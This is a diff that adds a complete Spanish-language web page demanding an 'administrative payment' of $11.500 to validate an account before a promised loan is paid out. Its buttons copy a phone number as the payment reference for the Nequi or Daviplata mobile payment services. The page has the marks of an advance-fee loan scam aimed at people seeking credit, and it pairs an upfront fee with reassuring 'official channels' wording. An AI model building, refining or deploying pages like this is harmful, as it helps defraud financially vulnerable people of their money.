@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pago administrativo</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #161B32;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    color: white;
+}
+
+/* Contenedor */
+.wrapper {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+/* Tarjeta */
+.card {
+    width: 430px;
+    background: #1c2145;
+    border-radius: 22px;
+    padding: 45px 40px;
+    box-shadow: 0 30px 60px rgba(0,0,0,0.55);
+    animation: fadeUp 0.8s ease;
+    text-align: center;
+    position: relative;
+}
+
+@keyframes fadeUp {
+    from {opacity: 0; transform: translateY(40px);}
+    to {opacity: 1; transform: translateY(0);}
+}
+
+.card h2 {
+    color: #fa496e;
+    font-size: 20px;
+    margin-bottom: 20px;
+}
+
+.descripcion {
+    font-size: 14px;
+    line-height: 1.6;
+    opacity: 0.9;
+    margin-bottom: 25px;
+}
+
+/* Caja valor */
+.valor-box {
+    background: rgba(250,73,110,0.15);
+    border: 1px solid rgba(250,73,110,0.3);
+    padding: 18px;
+    border-radius: 14px;
+    font-size: 18px;
+    font-weight: bold;
+    margin-bottom: 30px;
+}
+
+/* Botones */
+.botones {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+}
+
+button.pagar {
+    padding: 14px;
+    background: #fa496e;
+    border: none;
+    border-radius: 10px;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 15px;
+    transition: 0.3s;
+}
+
+button.pagar:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 20px #fa496e;
+}
+
+/* Mensaje flotante arriba */
+.mensaje {
+    position: fixed;
+    top: -70px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #fa496e;
+    padding: 12px 20px;
+    border-radius: 8px;
+    font-size: 13px;
+    opacity: 0;
+    transition: 0.4s ease, top 0.4s ease;
+    z-index: 999;
+}
+
+.mensaje.mostrar {
+    opacity: 1;
+    top: 30px;
+}
+
+/* Seguridad */
+.seguridad {
+    font-size: 12px;
+    opacity: 0.6;
+    margin-top: 25px;
+}
+</style>
+</head>
+<body>
+
+<div class="mensaje" id="mensajeCopiado"></div>
+
+<div class="wrapper">
+    <div class="card">
+
+        <h2>Pago administrativo</h2>
+
+        <div class="descripcion">
+            Para continuar con el proceso debe realizar el pago del costo administrativo
+            a través de nuestros canales oficiales habilitadas para depositar el dinero a su cuenta.
+            <i style="color: rgba(255, 0, 0, 0.712);">Este pago es para validar la cuenta y verificar que el prestamo sea para la misma cuenta a nombre de la persona que lo solicito, una vez realizado el pago sera enviado al numero que proporciono para el respectivo desembolso.</i>
+        </div>
+
+        <div class="valor-box">
+            Valor a pagar: $11.500
+        </div>
+
+        <div class="botones">
+            <button class="pagar" onclick="copiarReferencia('Nequi')">Pagar con Nequi</button>
+            <button class="pagar" onclick="copiarReferencia('Daviplata')">Pagar con Daviplata</button>
+        </div>
+
+        <div class="seguridad">
+            Usa únicamente canales oficiales. Nunca compartas información sensible.
+        </div>
+
+    </div>
+</div>
+
+<script>
+const referencia = "3203478778";
+const mensaje = document.getElementById("mensajeCopiado");
+
+function copiarReferencia(metodo){
+    navigator.clipboard.writeText(referencia);
+
+    mensaje.innerText = "Referencia copiada. Dirígete a " + metodo + " y completa el pago. una vez realizado el dinero sera desembolsado";
+    mensaje.classList.add("mostrar");
+
+    setTimeout(() => {
+        mensaje.classList.remove("mostrar");
+    }, 3000);
+}
+</script>
+
+</body>
+</html>
